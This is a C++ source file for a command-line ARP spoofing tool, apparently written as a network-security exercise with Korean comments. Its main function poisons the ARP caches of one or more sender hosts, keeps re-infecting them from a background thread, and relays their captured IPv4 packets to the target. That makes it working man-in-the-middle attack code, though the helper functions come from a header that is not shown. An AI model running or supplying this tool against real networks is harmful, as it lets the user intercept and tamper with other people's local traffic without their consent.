#include "arp_spoof.h"

void usage() {
    printf("syntax: send-arp-spoof <interface> <sender-ip> <target-ip> [<sender-ip2> <target-ip2> ...]\n");
    printf("sample: send-arp-spoof wlan0 192.168.1.10 192.168.1.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2 != 0)) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    Mac attacker_mac;
    Ip attacker_ip;

    // Attacker info 
    if (!get_Address(dev, &attacker_mac, &attacker_ip)) {
        fprintf(stderr, "ᓚᘏᗢ Failing: attack info \n");
        return EXIT_FAILURE;
    }

    // Send packet
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, 65536, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "ᓚᘏᗢ Failing: not open device\n");
        return EXIT_FAILURE;
    }

    //Multi pair management(Send IP & Tar IP)
    std::vector<Session> sessions;

    // First infection..
    for (int i = 2; i < argc; i += 2) {
        Session session;
        session.sender_ip_ = Ip(argv[i]);
        session.target_ip_ = Ip(argv[i+1]);

        // Sender info
        session.sender_mac_ = get_SenderMac(pcap, attacker_mac, attacker_ip, session.sender_ip_);
        if (session.sender_mac_ == Mac::nullMac()) {
            fprintf(stderr, "ᓚᘏᗢ Failing: sender info(IP: %s)\n", argv[i]);
            continue;
        }

        // Target Info 
        session.target_mac_ = get_SenderMac(pcap, attacker_mac, attacker_ip, session.target_ip_);
        if (session.target_mac_ == Mac::nullMac()) {
            fprintf(stderr, "ᓚᘏᗢ Failing: target info(IP: %s)\n", argv[i+1]);
            continue;
        }

        sessions.push_back(session); //쟤네 저장

        // send infect용 packet
        send_arp_infect(pcap, attacker_mac, session.sender_mac_, session.sender_ip_, session.target_ip_);
        printf("ᓚᘏᗢ ᓚᘏᗢ ARP Infect Sent -> Sender: %s | Target: %s\n", argv[i], argv[i+1]);
    }

    // no other muti pair 
    if (sessions.empty()) {
        fprintf(stderr, "ᓚᘏᗢ No longer target\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    //recover start
    pthread_t infect_thread; //주기적으로 감염 패킷을 날려줄 스레드 생성
    ThreadArgs thread_args = { pcap, attacker_mac, sessions };
    if (pthread_create(&infect_thread, nullptr, infection_thread_func, &thread_args) != 0) {
        fprintf(stderr, "ᓚᘏᗢ Failing: infection thread\n");
    }
    pthread_detach(infect_thread); // 계속 실행

    // Steal.. Reply..
    struct pcap_pkthdr* header;
    const u_char* packet;

    printf("ᓚᘏᗢ ᓚᘏᗢ Start ARP Spoofing & Relay Loop...\n");
    while (true) {
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res < 0) break;

        struct EthHdr* eth_hdr = (struct EthHdr*)packet;

        if (ntohs(eth_hdr->type_) != EthHdr::Ip4) continue; //IPv4 아니면 ignore

        for (const auto& session : sessions) { //Only Sender packet -- next --> target으로 relay 
            if (eth_hdr->smac() == session.sender_mac_ && eth_hdr->dmac() == attacker_mac) {
                relay_packet(pcap, packet, header->caplen, session, attacker_mac);
                break;
            }
        }
    }

    pcap_close(pcap);
    return 0;
}